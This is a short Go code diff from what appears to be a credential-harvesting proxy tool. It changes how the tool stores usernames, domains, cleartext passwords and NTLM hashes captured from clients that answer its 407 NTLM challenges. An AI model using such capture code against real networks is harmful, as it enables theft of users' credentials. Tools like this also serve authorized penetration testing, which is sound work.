@@ -77,7 +77,16 @@ func HandleProxy(c net.Conn) {
 			if len(parts) == 2 {
 				decoded, err := base64.StdEncoding.DecodeString(parts[1])
 				if err == nil {
-					core.LogSuccess("[Proxy] Cleartext auth from %s: %s", c.RemoteAddr(), string(decoded))
+					creds := strings.SplitN(string(decoded), ":", 2)
+					pUser, pPass := creds[0], ""
+					if len(creds) == 2 {
+						pPass = creds[1]
+					}
+					pDom := ""
+					if i := strings.Index(pUser, "\\"); i >= 0 {
+						pDom, pUser = pUser[:i], pUser[i+1:]
+					}
+					core.SaveCleartext("Proxy", c.RemoteAddr().String(), pUser, pDom, pPass)
 				}
 			}
 			sendProxyResponse(c, 407, "NTLM", nil)
@@ -115,10 +124,7 @@ func HandleProxy(c net.Conn) {
 				sendProxyResponse(c, 407, "NTLM", nil)
 				return
 			}
-			core.LogSuccess("[Proxy] %s captured from %s", ntlmVer, c.RemoteAddr())
-			core.LogSuccess("        %s\\%s", domain, user)
-			core.LogSuccess("        %s", hash)
-			core.SaveHash(hash)
+			core.SaveCapture("Proxy", c.RemoteAddr().String(), user, domain, ntlmVer, hash)
 			sendProxyResponse(c, 407, "NTLM", nil)
 			return
 
